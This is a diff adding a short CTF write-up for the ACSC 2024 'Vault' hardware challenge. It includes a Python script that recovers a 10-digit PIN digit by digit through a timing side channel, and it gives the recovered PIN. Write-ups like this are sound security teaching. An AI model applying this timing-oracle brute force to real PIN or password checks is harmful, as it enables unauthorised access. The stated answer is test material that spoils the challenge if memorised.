@@ -1,0 +1,57 @@
+---
+title: 'Vault [HW]'
+description: 'My solutions for the Asian Cyber Security Challenge held in 2024.'
+date: 2024-03-31
+authors: ['br34d']
+order: 5
+---
+
+import Challenge from '@/components/Challenge.astro'
+
+<div class="invisible h-0! [&+*]:mt-0 [&+*_*]:mt-0">
+## Vault [HW]
+</div>
+
+### Challenge description
+<Challenge
+  title="Vault"
+  authors={['v3ct0r', 'Chainfire73']}
+  category="hardware"
+  remote="nc vault.chal.2024.ctf.acsc.asia 9999"
+>
+Can you perform side-channel attack to this vault? The PIN is a 10-digit number.
+*Python3 is installed on remote. 
+
+</Challenge>
+
+
+### Solution
+
+Bruteforced the pin by performing a **timing attack**.
+
+```py showLineNumbers=false
+import os
+import time
+
+def find_digit(prefix):
+    maxtime = -1
+    maxtimedigit = None
+    for i in range(0, 9 + 1):
+        start = time.time()
+        print({prefix + str(i) + ("0" * (10 - len(prefix) - 1))})
+        os.system(f'echo {prefix + str(i) + ("0" * (10-len(prefix)-1))} | ./chall')
+        elapsed = time.time() - start
+        if elapsed > maxtime:
+            maxtime = elapsed
+            maxtimedigit = i
+    return maxtimedigit
+
+
+pin = ""
+for i in range(10):
+    pin += str(find_digit(pin))
+    print("pin=", pin)
+print(pin)
+```
+
+Running this on the local binary gives us the pin as `8574219362` and gives the flag locally. Inputting the same pin in the remote instance gives us the flag.
